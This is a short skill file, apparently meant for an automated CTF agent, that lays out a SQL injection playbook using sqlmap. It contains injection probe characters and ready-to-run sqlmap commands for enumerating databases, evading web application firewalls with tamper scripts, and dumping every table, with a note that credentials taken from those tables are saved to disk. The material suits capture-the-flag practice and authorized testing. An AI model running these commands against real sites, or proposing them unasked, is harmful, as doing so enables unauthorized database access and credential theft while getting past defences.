---
name: ctf-web-sqli
description: SQL injection detection and exploitation using SQLMap
tags: [web, sqli, database]
prerequisites: [target_url]
---

# CTF Web - SQL Injection

## When to Use
Use when a web endpoint:
- Reflects user input in responses
- Shows database errors
- Has suspicious parameter names (id, user, search, etc.)
- Uses database-backed functionality

## Decision Framework
1. Test for reflection: `' " ) } --`
2. Identify injection type: error-based, boolean-based, time-based
3. Check for WAF: unusual blocks, CAPTCHAs, rate limiting

## Execution Steps

### Step 1: Initial Detection
```bash
sqlmap -u "http://<TARGET_URL>/page?id=1" --batch --dbs
```

### Step 2: WAF Evasion (if detected)
```bash
sqlmap -u "http://<TARGET_URL>/page?id=1" --batch --tamper=space2comment,between,equaltolike
```

### Step 3: Data Exfiltration
```bash
sqlmap -u "http://<TARGET_URL>/page?id=1" --batch -D database_name --dump-all
```

## Output Parsing
- Database names are extracted
- Table contents with credentials are stored
- Raw output saved to `/workspace/sqli_output.txt`

## Expected Output Format
```
available databases [3]:
[*] information_schema
[*] mysql
[*] webapp_db
```

## Common Pitfalls
- Always use `--batch` to avoid interactive prompts
- Use tamper scripts if WAF is detected
- Verify injection before full dump (saves time)
